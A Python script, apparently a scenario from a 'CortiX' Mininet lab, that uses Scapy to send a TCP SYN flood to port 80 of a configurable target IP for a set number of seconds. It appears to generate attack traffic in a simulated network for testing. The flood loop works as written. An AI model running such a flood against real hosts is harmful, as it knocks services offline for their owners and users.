"""
CortiX Mininet Lab Scenario — DoS Flood Attack

Simulates a TCP SYN flood DoS attack using high frequency packet sends.
"""

import sys
import argparse
import logging
import time

try:
    from scapy.all import IP, TCP, send
except ImportError:
    IP = TCP = send = None

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("cortix.lab.scenarios.dos_attack")


def run_dos(target_ip: str, duration: int):
    if IP is None:
        logger.error("Scapy is required to run simulation.")
        return

    logger.info("Starting DoS flood SYN attack targeting host: %s for %d seconds", target_ip, duration)
    start_time = time.time()
    count = 0

    try:
        while time.time() - start_time < duration:
            # Send flood packets at maximum throughput
            pkt = IP(dst=target_ip) / TCP(dport=80, flags="S")
            send(pkt, verbose=False)
            count += 1
            if count % 100 == 0:
                logger.info("Sent %d flood packets...", count)
    except KeyboardInterrupt:
        logger.info("DoS attack halted.")

    logger.info("DoS Flood Attack Simulation Complete. Total sent: %d packets.", count)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate SYN Flood DoS")
    parser.add_argument("--target", type=str, default="10.0.0.2", help="Target victim IP")
    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
    args = parser.parse_args()

    run_dos(target_ip=args.target, duration=args.duration)
